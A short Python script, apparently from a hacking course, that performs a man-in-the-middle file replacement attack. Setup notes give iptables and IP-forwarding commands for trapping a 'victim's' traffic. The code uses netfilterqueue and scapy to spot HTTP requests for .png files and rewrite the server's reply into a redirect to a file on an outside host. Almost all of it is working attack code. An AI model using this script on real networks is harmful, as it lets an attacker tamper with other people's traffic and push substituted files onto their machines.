#!/usr/bin/env python
"""
first of all issue this command to trap victim's requests and this library to modify net filter queue
1- 
    1-1 iptables -I FORWARD -j NFQUEUE --queue-num 0
    1-2 after we are done do this to nullify iptables: iptables --flush

2- 
    2-1 pip install netfilterqueue
    2-2 if failed, try this first: apt install libnfnetlink-dev libnetfilter-queue-dev
3- echo 1 > /proc/sys/net/ipv4/ip_forward
============================================
in case when we want to check out on our local computer:
1- iptables -I OUTPUT -j NFQUEUE --queue-num 0
2- iptables -I INPUT -j NFQUEUE --queue-num 0
3- after done, iptables --flush

"""

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    #removing neccessary fields to not to damage packet
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def processPacket(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            #print("HTTP Request")
            if b".png" in scapy_packet[scapy.Raw].load:
                print("[+] png request found...")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            #print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] replacing file")
                #print(scapy_packet.show())
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.herbipharmed.co.ir/Slider/cute-theme/trans.png")
                
                #after make changes, we need to first convert our packet to bytes and then set the payload we want
                packet.set_payload(bytes(modified_packet))
    
    #packet.drop() #cut the internet of victim
    packet.accept() #it will simply direct packets to their destination

#creating an instance of netfilterque object
queue = netfilterqueue.NetfilterQueue() 

#to bind the queue with the queue that we have created with iptabls
queue.bind(0, processPacket)
queue.run()